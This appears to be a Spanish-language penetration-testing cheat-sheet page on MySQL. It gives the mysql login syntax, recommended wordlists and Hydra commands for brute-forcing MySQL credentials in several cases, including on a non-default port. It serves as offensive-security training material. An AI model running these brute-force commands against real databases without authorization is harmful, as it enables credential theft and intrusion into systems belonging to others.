# MySQL

{% hint style="info" %}
Para hacer login en una base de datos con mysql, ejecutamos el siguiente comando:

```bash
mysql -h 192.168.1.12 -u usuario -ppassword
```

ATENCION!! En el último parámetro, pondremos `-p` seguido de la contraseña sin espacios
{% endhint %}

## Fuerza Bruta

{% hint style="success" %}
A la hora de emplear diccionarios se recomiendan los siguientes:

### Usuarios

```
/usr/share/wordlists/metasploit/unix_users.txt
```

### Contraseñas

```
/usr/share/wordlists/rockyou.txt
```
{% endhint %}

### Hydra

Para poder hacer fuerza bruta con hydra al servicio de bases de datos, se pueden dar varios casos, en el caso de que tengas el usuario pero no la contraseña, deberás de usar un diccionario en este aspecto, por lo que el comando sería el siguiente

```
hydra -l user -P passwords.txt mysql://127.0.0.1 -t 15
```

En este caso con el parámetro `-l` le indicamos que sabemos el usuario y con el parámetro `-P` le indicamos la ruta donde esta el diccionario de contraseñas.

{% hint style="warning" %}
Puede que el servicio MySQL no se encuentre en el puerto predefinido, en ese caso deberemos de especificar a hydra el puerto en el que está, esto se hace con el parámetro `-s`

```
hydra -l user -P passwords.txt mysql://127.0.0.1 -t 15 -s 2000
```
{% endhint %}

En el caso contrario de que no sepas el usuario pero si la contraseña, los parámetros querían así:

```
hydra -L users.txt -p Password123 mysql://127.0.0.1 -t 15
```

En este comando, le indicamos la ruta del diccionario de usuarios con el parámetro en mayúscula y una contraseña en concreto con el parámetro en minúscula. En el otro posible caso de que no tengamos ni la contraseña ni el usuario, pondremos los dos parámetros en mayúscula pasándole como valor la ruta del diccionario tanto de usuarios como de contraseñas.

```
hydra -L users.txt -P passwords.txt mysql://127.0.0.1 -t 15
```

{% hint style="info" %}
El con el parámetro`-t` le indicamos el número de hilos que queremos emplear
{% endhint %}
